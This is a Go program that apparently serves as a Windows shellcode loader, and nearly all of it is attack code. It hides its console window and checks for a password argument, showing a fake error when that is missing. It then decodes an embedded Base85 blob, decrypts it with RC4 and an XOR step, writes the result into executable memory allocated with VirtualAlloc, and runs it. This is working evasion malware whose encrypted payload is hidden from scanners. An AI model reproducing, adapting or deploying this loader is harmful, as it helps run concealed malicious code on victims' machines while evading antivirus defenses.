package main

import (
	"crypto/rc4"
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"
	"os"

	"github.com/eknkc/basex"
	"github.com/gonutz/ide/w32"
)

const (
	memCommit            = 0x00001000
	memReserve           = 0x00002000
	pageExecute          = 0x10
	pageExecuteRead      = 0x20
	pageExecuteReadWrite = 0x40
	pageExecuteWrite     = 0x80
	memRelease           = 0x8000
)

func yincang(commandShow uintptr) {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, commandShow)
		}
	}
}

func main() {
	yincang(w32.SW_HIDE)

	args := os.Args
	if len(args) != 2 || args[1] != "123456" {
		fmt.Println("The program doesn't work. Try again")
		return
	}
	key := []byte("Spartan-Cybersec")
	encodedMessage := "F3*k`&P&my~#`${IqOn0YA-hteo3QS=>nMBi#QFoH>7`@xt=pZt{3+}F|>MBJt)Kcdad&h5&T#Ut^VJ*FvdwE)XEl?`lEJIZtpZ{8q6_<HGqj=8gaE&bB#uq5bCGP15ti|fgv46Of)z37QiP&M%<9h11%A#qASSeN@L{%VZd8na&tZDWqTY~hTJ#|;xU}3t&mb~JQ90SROt-cjeS~1ozAX2LM}5Mf<d_>PEl!*EZCOLVrcjrF0p|N?!zR2dD<Xze@{v|`XD<F7mrK2YkFxPtv1o>O@J!$TCxcEEKaQDqW=(Yl0Sm7HddL;kp9e|NxjtjdY=R4Du!d(Tc=KG$=`c{Gq>KdsxsMb?1~K#=Y-ddRMxk?)+F>T8xql68PWwF{rHb9?8&~YtpaAYcHl1ZcM5lZ>il3dG7}c}}j7wwVC+ZVr4;Ig2XaMK5o@g_@Qvg9TWxACc0Fe<In(dKgDbZR&b?>BUXZ^R8jpae3~A~=%KE~Ld+!wH2SexK7?px9atKj4Y8w(rSJ(trq*FO4Tnc;lR*PgP6w9{|uBE+77>oCzgw8dI1gf}{uPTz!A7=_N18#PnF-OQ`6H!DhxIjc0yW(O7M-eZ@8VgqMyv<BvSyYY=`@p6h6L~vRIHJ-6f`BP2b{k}SImJMR`#|YoBIp5ICQpqEOV)T8DSPkJA7Zrmri!7$?Ltie_~K2y1-JvH;hVK*U^fW2n2x6!6OWRhDxc!UD=%z%o#}?dDF}#|9JF@p^K5Og!srd~@A6O&=Yve;xTq%%<Y7CQ3<4Q36&4>D^g9FpVCmipASvKwZtA11GV0!d%EuEM{!}!2K6p9l6X{lZ`p9u%6E+P?f4AL^MTkzY+b`WJn^ja_$-2~JqZUY3;fkJJ3s5D_@ej0+2JY*OJqvx-w~6T`R%p{h^q*NafJ@+7Q8BkqP*R^{?1FN}=<qG$5<iD$<Xf`mTxZHhh0%EKVef*!LZlp;^-}@#6}XuXd49Ar{F4*8X#h6PDFY|<I79@FNgU`EQZnZeMm!T=hw!bFfj38>CxV^~;&)FvjFYG5m#h75-PA8w17};=B6kT*pWKd`)vJq-@*-b0Ms|If!<rDfPs`g?7#|b4?Y=5-xVlk&#F#W`z7LcVp|z<71IVN6yANl-$*i7NNQGQCDG{!QycTgpnixiplDXh9S5oBQ=`VHRPKG+SMHHDn*MkEceGkhM&nydOF2N!2p7&AOAasesjQqVy08k56qP@r@L~7I$E}|&MeKPcw~j#g$Tn82$41ZilCtbmN`0yGEe{+ielSs-<=d)vf2FL!m>{4$94d~&cyl7NuFzD9aV|~%p-DX!hm$nDz}#DXkgZRUkh*^O-0%{<+K;`-lH9HY+HUw3g3__VSE7&$n<8P{N#JEdhfr!Mxez+TKTnZh%GkR+rgkft@hI$k75Zwa|!6t=MVh{klNs}6g+L$yzoRlR2@%dp_e>@B*V|dl-jhDNyl_ppgm*8lhBe{t^|QznkeaL?&;)T1Qs$p0oX##"
	//111
	// Base85 
	base85, _ := basex.NewEncoding("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~")
	hexCiphertext, _ := base85.Decode(encodedMessage)

	// Conversion binaria
	rc4Message := make([]byte, hex.DecodedLen(len(hexCiphertext)))
	n, _ := hex.Decode(rc4Message, hexCiphertext)
	rc4Message = rc4Message[:n]

	// RC4 
	cipher, _ := rc4.NewCipher(key)
	xordMessage := make([]byte, len(rc4Message))
	cipher.XORKeyStream(xordMessage, rc4Message)

	// XOR 
	message := make([]byte, len(xordMessage))
	for i := 0; i < len(xordMessage); i++ {
		message[i] = xordMessage[i] ^ 0xff
	}

	kernel32, _ := syscall.LoadLibrary("kernel32.dll")
	VirtualAlloc, _ := syscall.GetProcAddress(kernel32, "VirtualAlloc")
	VirtualFree, _ := syscall.GetProcAddress(kernel32, "VirtualFree")

	// Asignar memoria y escribir datos binarios descifrados
	allocSize := uintptr(len(message))
	mem, _, err := syscall.Syscall6(uintptr(VirtualAlloc), 4, 0, allocSize, memCommit|memReserve, pageExecuteReadWrite, 0, 0)
	if err != 0 {
		panic(fmt.Sprintf("VirtualAlloc failed with error code %d", err))
	}
	buffer := (*[1 << 30]byte)(unsafe.Pointer(mem))[:allocSize:allocSize]
	copy(buffer, message)

	// Ejecutar los datos binarios descifrados
	_, _, err = syscall.Syscall(uintptr(mem), 0, 0, 0, 0)
	if err != 0 {
		panic(fmt.Sprintf("Failed to execute shellcode with error code %d", err))
	}

	// liberar memoria
	_, _, err = syscall.Syscall6(uintptr(VirtualFree), 3, mem, 0, memRelease, 0, 0, 0)
	if err != 0 {
		panic(fmt.Sprintf("Failed to release memory with error code %d", err))
	}
}